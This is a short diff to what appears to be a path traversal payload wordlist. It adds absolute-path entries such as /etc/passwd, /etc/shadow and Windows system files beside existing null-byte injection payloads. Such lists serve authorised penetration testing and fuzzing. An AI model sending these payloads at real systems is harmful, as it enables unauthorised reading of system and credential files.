@@ -39,3 +39,11 @@
 # Null byte injection
 ../../../etc/passwd%00
 ../../../etc/passwd%00.jpg
+
+# Absolute path traversal
+/etc/passwd
+/etc/hosts
+/etc/shadow
+C:\boot.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\win.ini
